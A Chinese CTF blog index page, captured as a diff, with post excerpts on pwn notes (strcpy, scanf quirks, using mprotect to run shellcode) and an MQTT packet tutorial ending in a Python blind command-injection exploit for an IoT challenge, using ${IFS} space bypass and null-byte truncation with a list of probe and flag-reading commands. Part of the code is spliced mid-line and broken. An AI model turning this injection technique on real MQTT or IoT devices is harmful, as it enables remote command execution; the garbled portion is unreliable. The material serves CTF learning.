+<li>例如 <code>malloc()</code> 分配大内存时底层可能调用 <code>mmap</code></li>
+</ol>
+</li>
+</ol>
+<p>堆里面也可以看到malloc大内存。有mmap</p>
+<h1 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h1><p> 在C++中，strcpy函数用于将一个字符串复制到另一个字符串。这个函数定义在__头文件中，并且属于_std_命名空间。使用时，需要确保目标字符串的大小足以容纳源字符串，否则可能会导致缓冲区溢出。</p>
+<pre><code class="language-plain">#include 
+#include 
+
+int main() &#123;
+char src[40];
+char dest[100];
+
+// 使用strcpy函数复制字符串
+std::strcpy(dest, &quot;Hello, World!&quot;);
+
+std::cout &lt;&lt; &quot;dest: &quot; &lt;&lt; dest &lt;&lt; std::endl; // 输出: dest: Hello, World!
+return 0;
+&#125;
+</code></pre>
+<p> 为了提高安全性，C++引入了_strcpy_s_函数，它要求额外指定目标缓冲区的大小。如果使用动态分配的字符串，则应使用带有三个参数的版本，其中第二个参数是目标缓冲区的大小。</p>
+<h1 id="scanf函数"><a href="#scanf函数" class="headerlink" title="scanf函数"></a>scanf函数</h1><p>参数%d</p>
+<h2 id="正常输入时"><a href="#正常输入时" class="headerlink" title="正常输入时"></a>正常输入时</h2><p>输入为范围在-2147483648~2147483647内的整数。</p>
+<h2 id="如果输入范围在"><a href="#如果输入范围在" class="headerlink" title="如果输入范围在"></a>如果输入范围在</h2><p>-9223372036854775808~9223372036854775807内的整数，则会截断高位读取，此范围是long long int的范围。</p>
+<h2 id="如果输入范围在long-long-int范围之外，"><a href="#如果输入范围在long-long-int范围之外，" class="headerlink" title="如果输入范围在long long int范围之外，"></a>如果输入范围在long long int范围之外，</h2><p>则统一将参数赋值为-1（0xFFFFFFFF）</p>
+<h2 id="如果输入为非数字，"><a href="#如果输入为非数字，" class="headerlink" title="如果输入为非数字，"></a>如果输入为非数字，</h2><p>分为下列情况：</p>
+<p>– （1） 如果输入仅有一个，则该输入无效，该值不变。</p>
+<p>– （2） 如果输入有数字前缀（如12345abcd），则scanf仅会读取前面的数字，从第一个非数字开始，后面全部舍弃（12345）。</p>
+<p>– （3） 如果输入有多个且使用一个scanf语句（如scanf(“%d, %d”, &amp;a, &amp;b)）。输入第一个非数字后，后面的所有输入均为无效，前面的输入可以赋值。</p>
+<p>– （4） 如果输入有多个且使用多个scanf语句（含循环，即一个scanf中仅有一个输入），则输入非数字时，如果输入的不是’+’或’-’，则后面紧跟的所有scanf均自动跳过，变为无效，不能输入。如果输入的是’+’或’-’，则会跳过当前输入，后面仍然可以进行输入。应用：XCTF dubblesort</p>
+<h1 id="mprotect函数"><a href="#mprotect函数" class="headerlink" title="mprotect函数"></a>mprotect函数</h1><p>函数原型如下：</p>
+<pre><code class="language-plain">int mprotect(void * addr, size_t len, int prot)
+</code></pre>
+<p>其中变量addr代表对应内存块的指针，len代表内存块的大小，而prot代表内存块所拥有的权限</p>
+<p>对于prot来说，对应权限依照以下规则改变值</p>
+<p>无法访问 即PROT_NONE：不允许访问，值为 0</p>
+<p>可读权限 即PROT_READ：可读，值加 1</p>
+<p>可写权限 即PROT_WRITE：可读， 值加 2</p>
+<p>可执行权限 即PROT_EXEC：可执行，值加 4</p>
+<p>例如：我们要将某块内存区域权限设置为可读可写可执行，那么mprotect函数中prot参数便应该是1+2+4&#x3D;7。</p>
+<h2 id="这个函数主要是这么用"><a href="#这个函数主要是这么用" class="headerlink" title="这个函数主要是这么用"></a>这个函数主要是这么用</h2><p>利用mprotect与read等输入函数配合修改栈或bss段权限以执行shellcode</p>
+<p>SROP</p>
+<p> ciscn_2019_s_3  （BUUCTF）</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #ffa2c4">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/mmap/" style="color: #03a9f4">mmap</a>
+        </span>
+        
+    </div>
+    <a href="/2025/07/15/%E5%85%B6%E5%AE%83%E7%9A%84/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/07/10/MQTT%20PUBLISH%20%E6%95%B0%E6%8D%AE%E5%8C%85/">
+        <h2 class="post-title">MQTT PUBLISH 数据包解析</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/7/10
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>它分为三个部分：</p>
+<ol>
+<li><strong>固定报头 (Fixed Header)：</strong> 包含报文类型（PUBLISH）和整个数据包剩余部分的长度。</li>
+<li><strong>可变报头 (Variable Header)：</strong> 对于 PUBLISH 报文，这里主要存的是 Topic（主题名）。</li>
+<li><strong>有效载荷 (Payload)：</strong> 就是我们真正想发送的消息内容（即带有漏洞利用代码的字符串）。</li>
+</ol>
+<h3 id="pack-str-s-：MQTT-的字符串打包器"><a href="#pack-str-s-：MQTT-的字符串打包器" class="headerlink" title="pack_str(s)：MQTT 的字符串打包器"></a><code>pack_str(s)</code>：MQTT 的字符串打包器</h3><p>在 C 语言中，字符串以 <code>\x00</code> 结尾。但在网络传输（特别是 MQTT 协议）中，为了防止数据截断，字符串采用的是长度前缀机制。也就是说，你要发一个字符串，必须先用 2 个字节告诉对方这个字符串有多长。</p>
+<pre><code class="language-python">def pack_str(s):
+    # !H 代表 2 字节的大端序长度，强制加在字符串前面
+    return struct.pack(&quot;!H&quot;, len(s)) + s
+</code></pre>
+<ul>
+<li><code>**struct.pack(&quot;!H&quot;, len(s))**</code>** 是什么**<ul>
+<li><code>!</code> 代表<strong>大端序（网络字节序）</strong>，这是网络协议通信的通用标准（高位字节在前，低位字节在后）。</li>
+<li><code>H</code> 代表无符号短整型（Unsigned Short），刚好占用 <strong>2 个字节</strong>，最大可以表示 65535 的长度。</li>
+</ul>
+</li>
+<li><strong>举个例子：</strong> 如果你要发送 Topic 名 <code>&quot;HTTP&quot;</code>（长度为 4）。 <code>len(&quot;HTTP&quot;)</code> 是 4。打包后，前面会生成两个字节 <code>\x00\x04</code>。 最终返回的字节流就是：<code>b&#39;\x00\x04HTTP&#39;</code>。服务端收到后，先读两字节发现是 4，接着往后读 4 个字节，就精准拿到了 “HTTP”。</li>
+</ul>
+<h3 id="enc-varint-x-：变长编码（最精妙的设计）"><a href="#enc-varint-x-：变长编码（最精妙的设计）" class="headerlink" title="enc_varint(x)：变长编码（最精妙的设计）"></a><code>enc_varint(x)</code>：变长编码（最精妙的设计）</h3><p>这是 MQTT 协议为了省流量搞出来的一个特殊算法，用来表示剩余长度。 如果数据包很小，剩余长度用 1 个字节就够了；如果很大，可能需要 2 到 4 个字节。MQTT 是怎么知道这个长度到底占用了几个字节呢？</p>
+<p>它巧妙地利用了每个字节的<strong>最高位（第 8 位）作为延续位</strong>：</p>
+<ul>
+<li>如果最高位是 <code>1</code>，说明“还没完，下一个字节也是长度的一部分”。</li>
+<li>如果最高位是 <code>0</code>，说明“这就是长度字段的最后一个字节了”。 剩下的 7 位才用来存储真正的数值数据（即 Base-128 编码）。</li>
+</ul>
+<pre><code class="language-python">def enc_varint(x):
+    out = b&quot;&quot;
+    while True:
+        b = x % 128       # 取出低 7 位的值 (因为 128 是 2 的 7 次方)
+        x //= 128         # 把原数右移 7 位，准备处理下一批数据
+        if x &gt; 0:
+            b |= 0x80     # 如果 x 还没处理完，把 b 的最高位设为 1 (0x80 即二进制 10000000)
+        out += bytes([b]) # 把算好的这个字节加到结果里
+        if x == 0:        # 处理完了，返回！
+            return out
+</code></pre>
+<ul>
+<li><strong>举个例子：</strong> 假设我们要发送的剩余内容长度是 <code>130</code> 个字节。<ul>
+<li><strong>第一轮循环：</strong><ul>
+<li><code>b = 130 % 128 = 2</code>。</li>
+<li><code>x = 130 // 128 = 1</code>。</li>
+<li>因为 <code>x &gt; 0</code>，所以 <code>b |= 0x80</code>，<code>b</code> 变成了 <code>2 | 128 = 130</code>（十六进制 <code>0x82</code>）。</li>
+<li><code>out</code> 记录下 <code>\x82</code>（最高位是 1，意思是：别急，后面还有）。</li>
+</ul>
+</li>
+<li><strong>第二轮循环：</strong><ul>
+<li><code>b = 1 % 128 = 1</code>。</li>
+<li><code>x = 1 // 128 = 0</code>。</li>
+<li>因为 <code>x == 0</code>，不需要打标记了，<code>b</code> 依然是 1（十六进制 <code>0x01</code>）。</li>
+<li><code>out</code> 加上 <code>\x01</code>（最高位是 0，意思是：长度读完了！）。</li>
+</ul>
+</li>
+<li>最终返回 <code>b&#39;\x82\x01&#39;</code>。服务端靠这两个字节就能反解出真实的长度 130。</li>
+</ul>
+</li>
+</ul>
+<h3 id="publish-和-send-pkt：终极拼装与发射"><a href="#publish-和-send-pkt：终极拼装与发射" class="headerlink" title="publish 和 send_pkt：终极拼装与发射"></a><code>publish</code> 和 <code>send_pkt</code>：终极拼装与发射</h3><p>有了前面两个零件，现在可以组装真正的 MQTT 报文并发送了。</p>
+<pre><code class="language-python">def publish(self, topic, payload, qos=0):
+    # 1. 组装后面一大坨 (可变报头 + 有效载荷)
+    body = pack_str(topic) + payload 
+
+    # 2. 构造固定报头的第 1 个字节
+    hdr = 0x30 | (qos  0: b |= 0x80
+            out += bytes([b])
+            if x == 0: return out
+
+    def _pack_str(self, s):
+        if isinstance(s, str): s = s.encode()
+        return struct.pack(&quot;!H&quot;, len(s)) + s
+
+    def connect(self, client_id):
+        vh = self._pack_str(&quot;MQTT&quot;) + bytes([4, 2]) + struct.pack(&quot;!H&quot;, 60)
+        self.sock.sendall(bytes([0x10]) + self._enc_varint(len(vh + self._pack_str(client_id))) + vh + self._pack_str(client_id))
+        time.sleep(0.1) # 等待连接建立
+
+    def subscribe(self, topic):
+        body = struct.pack(&quot;!H&quot;, 1) + self._pack_str(topic) + bytes([0])
+        self.sock.sendall(bytes([0x82]) + self._enc_varint(len(body)) + body)
+        time.sleep(0.1)
+
+    def publish(self, topic, payload):
+        if isinstance(payload, str): payload = payload.encode()
+        body = self._pack_str(topic) + payload
+        self.sock.sendall(bytes([0x30]) + self._enc_varint(len(body)) + body)
+
+    def close(self):
+        self.running = False
+        try: self.sock.close()
+        except: pass
+
+# ==========================================
+# [ 雷达监听区 ] (后台守护线程，专门抓瞎打的回显)
+# ==========================================
+def radar_listener(client):
+    print(&quot;[*] Radar activated. Listening for echoes...&quot;)
+    while client.running:
+        try:
+            # 这里做了极简处理，实际可用 socket recv 循环读取
+            data = client.sock.recv(4096)
+            if not data: continue
+            
+            # 尝试在乱码的二进制流中提取可见文本
+            txt = data.decode(&#39;utf-8&#39;, &#39;ignore&#39;)
+            
+            # TODO: 根据题目具体的回显格式(JSON或明文)修改这里的匹配逻辑
+            if &quot;httpclient&quot; in txt or &quot;&#123;&quot; in txt:
+                print(f&quot;\n[Radar Catch] ==&gt; &#123;txt.strip()&#125;&quot;)
+            if &quot;flag&#123;&quot; in txt.lower() or &quot;ctf&#123;&quot; in txt.lower():
+                print(f&quot;\n[!!!] BINGO! FLAG FOUND: &#123;txt.strip()&#125;\n&quot;)
+        except:
+            break
+
+# ==========================================
+# [ 漏洞利用核心区 ] (你需要根据题目修改这里)
+# ==========================================
+def fire_payload(cmd):
+    &quot;&quot;&quot;
+    在这里构造你的特定 Payload。
+    支持返回单次请求，或者由多次请求组成的攻击链。
+    &quot;&quot;&quot;
+    # 示例：针对 \x00 截断和二次覆盖漏洞的 Payload
+    # 使用 $&#123;IFS&#125; 绕过空格限制，使用 \x00 阻断解析
+    cmd = cmd if cmd.endswith(&quot;$&#123;IFS&#125;#&quot;) else cmd + &quot;$&#123;IFS&#125;#&quot;
+    stage1 = f&quot;GET /ctf/index_html;&#123;cmd&#125; HTTP/1.1\r\n\r\n\x00&quot;.encode()
+    stage2 = b&quot;GET /ctf/index_html HTTP/1.1\r\n\r\n\x00&quot;
+    
+    # 每次攻击建立一个新的独立客户端
+    attacker = RawMQTT(HOST, PORT)
+    attacker.connect(f&quot;atk_&#123;random.randint(100,999)&#125;&quot;)
+    
+    # 执行攻击链 (带容错延时)
+    attacker.publish(PUB_TOPIC, stage1)
+    time.sleep(0.5) 
+    attacker.publish(PUB_TOPIC, stage2)
+    
+    attacker.close()
+
+# ==========================================
+# [ 主控循环区 ] (稳健的盲打/爆破引擎)
+# ==========================================
+def main():
+    # 1. 启动接收端雷达
+    radar = RawMQTT(HOST, PORT)
+    radar.connect(f&quot;radar_&#123;random.randint(100,999)&#125;&quot;)
+    radar.subscribe(SUB_TOPIC)
+    
+    t = threading.Thread(target=radar_listener, args=(radar,), daemon=True)
+    t.start()
+    time.sleep(1) # 给雷达一点启动时间
+
+    # 2. 准备武器库 (根据系统环境定制盲猜命令)
+    arsenal = [
+        &quot;echo$&#123;IFS&#125;PWNED&quot;,   # 探针：测连通性
+        &quot;ls$&#123;IFS&#125;-la&quot;,       # 探针：看当前目录
+        &quot;cat$&#123;IFS&#125;f*&quot;,       # 盲狙：f开头文件
+        &quot;cat$&#123;IFS&#125;flag*&quot;,    # 盲狙：flag文件
+        &quot;cat$&#123;IFS&#125;/flag&quot;,    # 盲狙：根目录flag
+    ]
+
+    # 3. 循环开火 (带容错机制)
+    print(f&quot;[*] Starting attack loop. Total payloads: &#123;len(arsenal)&#125;&quot;)
+    for cmd in arsenal:
+        print(f&quot;[-] Firing: &#123;cmd&#125;&quot;)
+        try:
+            fire_payload(cmd)
+            time.sleep(2) # 打完一发，等雷达飞一会儿
+        except Exception as e:
+            print(f&quot;[!] Target choked on &#39;&#123;cmd&#125;&#39;: &#123;e&#125;&quot;)
+            time.sleep(1) # 容错休眠，防止把服务打挂
+
+    # 4. 打扫战场
+    print(&quot;[*] Arsenal empty. Waiting 3 seconds for lingering echoes...&quot;)
+    time.sleep(3)
+    radar.close()
+    print(&quot;[*] Done.&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #ff7d73">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/IoT/" style="color: #03a9f4">IoT</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/MQTT/" style="color: #ff7d73">MQTT</a>
+        </span>
+        
+    </div>
+    <a href="/2025/07/10/MQTT%20PUBLISH%20%E6%95%B0%E6%8D%AE%E5%8C%85/" class="go-post">阅读全文</a>
+</div>
+
+
+        <div class="page-current">
+    
+    <span class="current">1</span>
+    
+    <a class="page-num" href="/page/2">
+        2
+    </a>
+    
+    
+    <a class="page-num" href="/page/3">
+        3
+    </a>
+    
+    
+    
+    <a class="page-num" href="/page/2/">
+        <i class="fa-solid fa-caret-right fa-fw"></i>
+    </a>
+    
+</div>
+
+    </div>
+    
+    <div id="home-card">
+        <div id="card-style">
+    <div id="card-div">
+        <div class="avatar">
+            <img src="/images/lty.png" alt="avatar" />
+        </div>
+        <div class="name">良夜</div>
+        <div class="description">
+            <p>Here’s an cat…</p>
+
+        </div>
+        
+        <div class="icon-links">
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://github.com/ice993">
+                    <i
+                        class="fa-brands fa-github fa-fw"
+                    ></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="http://wpa.qq.com/msgrd?v=3&uin=2940582316&site=qq&menu=yes">
+                    <i
+                        class="fa-brands fa-qq fa-fw"
+                    ></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://x.com/Arctic_oceanIce">
+                    <i
+                        class="fa-brands fa-x-twitter fa-fw"
+                    ></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a href="mailto:2940582316@qq.com">
+                    <i
+                        class="fa-solid fa-envelope fa-fw"
+                    ></i>
+                </a>
+            </span>
+            
+        </div>
+        
+        
+    </div>
+</div>
+
+    </div>
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 良夜の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;良夜
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    <script>
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/sw.js");
+    }
+    </script>
+</body>
+</html>
